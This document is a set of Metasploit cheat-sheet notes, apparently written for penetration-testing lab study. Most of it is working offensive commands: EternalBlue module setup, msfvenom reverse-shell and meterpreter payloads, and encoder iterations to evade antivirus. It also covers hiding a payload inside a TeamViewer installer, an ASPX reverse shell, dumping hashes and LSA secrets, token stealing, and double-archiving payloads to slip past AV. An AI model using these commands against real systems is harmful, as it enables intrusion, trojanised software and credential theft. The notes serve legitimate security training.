```
$ msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
%% specific search in metasploit %%

```
$ msf6 exploit(windows/smb/ms17_010_psexec) > info
$ msf6 exploit(windows/smb/ms17_010_psexec) > setg RHOSTS 10.10.10.40
```
%% info to show details about selected module and setg to set a permanent variable until we change it %%

```
$ msf6 exploit(windows/smb/ms17_010_psexec) > show targets
```
%% show targets command to show the exact versions that are vunlerable to the selected module %%

### Encoders
```
$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
%% Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called msfpayload and msfencode. %%

```
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```
%% generating payload without encoding %%

```
$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```
%% generating payload with encoding shikata_ga_nai %%

```
$ msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
$ msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
```
%% set payload then show encoders for that payload in metasploit %%

```
$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```
%% once you view encoders available for a payload, you can set the encoder with msfvenom. Note most encoders will be detected by most modern AVs %%

```
$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
%% same command but with multiple iterations of the encoder to try and bypass AV %%

```
$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
```
%% virus total command to check if the generated payload is detected by AVs %%

### Setting up msfconsole database
```
$ sudo service postgresql status
$ sudo systemctl start postgresql
$ sudo msfdb init
$ sudo msfdb status
$ sudo msfdb run
```
%% connect to postgresql database which is used in conjuction with msfconsole to keep track of testing results %%

```
$ msfdb reinit
$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
$ sudo service postgresql restart
$ msfconsole -q

msf6 > db_status
```
%% If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with above commands %%

```
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1 

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
  
msf6 > workspace -h
```
%% command for working with different workspaces, they are like folders in a project in case you want to save different results for different hosts, workspace -h to view different commands to interact with the workspace  %%

### Importing scan results
```
$ msf6 > db_import Target.xml
$ msf6 > hosts
$ msf6 > services
```
%% you can import .xml file of nmap scan results to metasploit then use commands hosts and services to show respective request %%

### Using Nmap inside MSFconsole
```
$ msf6 > db_nmap -sV -sS 10.10.10.8
$ msf6 > hosts
$ msf6 > services
```
%% nmap command inside MSFconsole %%

### Data Backup, hosts and services
```
$ msf6 > db_export -h
$ msf6 > hosts -h
$ msf6 > services -h
$ msf6 > creds -h
$ msf6 > loot -h
```
%% db_export to backup our data, hosts and services shows host addresses and services discovered respectfully. Credentials reveals any creds revealed when using msfconsole and loot shows any systems owned %%

### Plugins
```
$ ls /usr/share/metasploit-framework/plugins
$ msf6 > load <plugin from the list>
$ msf6 > plugin_help
```
%% load plugin in msfconsole if it is from the list then add "help with underscore" to plugin name to get command list %%

```
$ git clone https://github.com/darkoperator/Metasploit-Plugins
$ ls Metasploit-Plugins
$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
%% download new plugin and copy it to plugins metasploit directory then follow the commands to load a plugin from metasploit %%

### Sessions
```
$ msf6 exploit(windows/smb/psexec_psh) > sessions
$ msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
```
%% list and interact with a session %%

```
$ msf6 exploit(multi/handler) > jobs -h
```
%% If, for example, we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using [CTRL] + [C]. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the jobs command to look at the currently active tasks running in the background and terminate the old ones to free up the port. %%

```
$ msf6 exploit(multi/handler) > exploit -j
```
%% run exploit in the context of a job %%

### Metepreter
```
$ meterpreter > getuid
$ meterpreter > ps
$ meterpreter > steal_token 1836
```
%% ps to get process list and then use steal_token to escalate our user privilege to run as one of the users with a higher privilege depending on what user context process is running as %%

```
$ meterpreter > bg
$ msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
$ msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
$ msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
$ msf6 post(multi/recon/local_exploit_suggester) > run
```
%% running local_exploit_suggester after putting your session in the background to check for local privilege escalation paths %%

```
$ meterpreter > hashdump
$ meterpreter > lsa_dump_sam
$ meterpreter > lsa_dump_secrets
```
%% meterpreter commands to dumps secrets and hashes %%

```
$ searchsploit -t Nagios3 --exclude=".py"
```
%% using searchsploit to looking for an exploit and exclude .py as .rb (not all) are compatible with metasploit modules so better if you use them %%

```
$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
$ msf6 > reload_all
$ msf6 > use exploit/unix/webapp/nagios3_command_injection
```
%% copying an exploit to the metasploit directory to use it with metasploit,  use snake-case, alphanumeric characters, and underscores instead of dashes.  You can then search for the module or go directly to that module with the path %%

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
$ msf6 > use multi/handler
```
%% create a reverse shell  .aspx payload with msfvenom . Use it with multi/handler to generate a shell%%

```
$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
%%   We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product.  To prevent suspicion and trigger normal continuation of norma execution of launched application we use the -k flag which pulls the payliad in a separate thread from the main application%%

```
$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
$ rar a ~/test.rar -p ~/test.js
$ mv test.rar test
$ rar a test2.rar -p test
$ mv test2.rar test2
```
%%  Archiving payload twice to bypass AV detection when transferring files onto our target machine, last command removes the.rar extension from our file making it ready for export %%
